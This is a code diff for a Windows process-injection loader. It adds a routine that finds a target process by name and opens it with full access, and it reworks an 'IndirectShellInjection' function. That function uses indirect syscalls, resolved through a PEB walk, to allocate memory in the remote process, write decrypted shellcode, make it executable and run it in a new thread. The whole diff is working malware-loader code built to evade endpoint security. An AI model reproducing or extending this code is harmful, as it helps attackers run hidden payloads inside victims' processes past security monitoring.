@@ -1,13 +1,77 @@
 #include "IS.h"
 #include "box.h"
+#include "struct.h"
+
+BOOL GetRemoteProcID
+(
+	IN LPCWSTR ProcName,
+	OUT DWORD* PID,
+	OUT HANDLE* hProcess
+)
+
+{
+
+	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
+	ULONG							uReturnLen1 = 0, uReturnLen2 = 0;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
+	PVOID							pValueToFree = NULL;
+	NTSTATUS						STATUS = 0;
+
+
+	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
+	if (pNtQuerySystemInformation == NULL) {
+		PRINT_ERROR("GetProcAddress");
+		return FALSE;
+	}
+
+	pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);
+
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+	if (SystemProcInfo == NULL)
+	{
+		PRINT_ERROR("HeapAlloc");
+		return FALSE;
+	}
+
+	pValueToFree = SystemProcInfo;
+
+	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
+	if (STATUS != 0x0) {
+		PRINT_ERROR("NtQuerySystemInformation");
+		return FALSE;
+	}
+
+	while (TRUE) {
+		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, ProcName) == 0)
+		{
+			*PID = (DWORD)SystemProcInfo->UniqueProcessId;
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
+			break;
+		}
+
+		if (!SystemProcInfo->NextEntryOffset)
+			break;
+
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
+
+	}
+
+	HeapFree(GetProcessHeap(), 0, pValueToFree);
+
+	if (*PID == NULL || *hProcess == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}
 
 /*-----------------------------------------------------[Indirect Syscalls]------------------------------------------------------*/
 
 
 BOOL IndirectShellInjection(
-	_In_ CONST DWORD PID,
-	_In_ CONST PBYTE pShellcode,
-	_In_ CONST SIZE_T sSizeofShellcode
+	IN DWORD PID,
+	IN HANDLE hProcess,
+	IN PBYTE pShellcode,
+	IN SIZE_T sSizeofShellcode
 )
 
 {
@@ -28,7 +92,7 @@ BOOL IndirectShellInjection(
 	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
 	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
 	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[8] = { 0 };
+	INSTRUCTIONS_INFO syscallInfos[7] = { 0 };
 
 	HMODULE ntdll = WalkPeb();
 	if (!ntdll)
@@ -47,7 +111,6 @@ BOOL IndirectShellInjection(
 
 	const CHAR* Functions[] =
 	{
-		"NtOpenProcess",
 		"NtAllocateVirtualMemory",
 		"NtWriteVirtualMemory",
 		"NtProtectVirtualMemory",
@@ -76,19 +139,10 @@ BOOL IndirectShellInjection(
 
 	/*--------------------------------------------------[Externally calling all function from Magma.asm]-------------------------------------------------------*/
 
-	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtOpenProcess
-	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))SyscallInvoker)
-		(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
-	if (STATUS_SUCCESS != STATUS)
-	{
-		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
-		State = FALSE; goto CLEANUP;
-	}
-
 	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);
 
 	// allocate SizeofShellcode to VirtualMemory
-	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtAllocateVirtualMemory
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
 	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
 		(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (STATUS_SUCCESS != STATUS)
@@ -104,7 +158,7 @@ BOOL IndirectShellInjection(
 
 
 	// Write the newly decrypted shellcode inside
-	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtWriteVirtualMemory
+	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
 	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
 		(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
 	if (STATUS_SUCCESS != STATUS)
@@ -116,7 +170,7 @@ BOOL IndirectShellInjection(
 	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);
 
 	// change permissions
-	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtProtectVirtualMemory
+	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
 	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
 		(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
 	if (STATUS_SUCCESS != STATUS)
@@ -127,7 +181,7 @@ BOOL IndirectShellInjection(
 
 	OKAY("Changed Allocation Protection from [RW] to [RX]");
 
-	SetConfig(syscallInfos[4].SSN, syscallInfos[4].SyscallInstruction); // NtCreateThreadEx
+	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtCreateThreadEx
 	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
 		(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
 	if (STATUS_SUCCESS != STATUS)
@@ -138,7 +192,7 @@ BOOL IndirectShellInjection(
 
 	OKAY("[0x%p] Successfully Created a Thread!", hThread);
 	INFO("Waiting for Thread to finish executing...");
-	SetConfig(syscallInfos[5].SSN, syscallInfos[5].SyscallInstruction); // NtWaitForSingleObject
+	SetConfig(syscallInfos[4].SSN, syscallInfos[4].SyscallInstruction); // NtWaitForSingleObject
 	STATUS = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
 		(hThread, FALSE, NULL);
 	INFO("Execution Completed! Cleaning Up!");
@@ -150,7 +204,7 @@ CLEANUP:
 
 
 	if (rBuffer) {
-		SetConfig(syscallInfos[6].SSN, syscallInfos[6].SyscallInstruction); // NtFreeVirtualMemory
+		SetConfig(syscallInfos[5].SSN, syscallInfos[5].SyscallInstruction); // NtFreeVirtualMemory
 		STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG))SyscallInvoker)
 			(hProcess, &rBuffer, &sSizeofShellcode, MEM_DECOMMIT);
 		if (STATUS_SUCCESS != STATUS) {
@@ -162,14 +216,14 @@ CLEANUP:
 	}
 
 	if (hThread) {
-		SetConfig(syscallInfos[7].SSN, syscallInfos[7].SyscallInstruction); // NtClose
+		SetConfig(syscallInfos[6].SSN, syscallInfos[6].SyscallInstruction); // NtClose
 		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
 		(hThread);
 		INFO("[0x%p] handle on thread closed", hThread);
 	}
 
 	if (hProcess) {
-		SetConfig(syscallInfos[7].SSN, syscallInfos[7].SyscallInstruction); // NtClose
+		SetConfig(syscallInfos[6].SSN, syscallInfos[6].SyscallInstruction); // NtClose
 		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
 		(hProcess);
 		INFO("[0x%p] handle on process closed", hProcess);
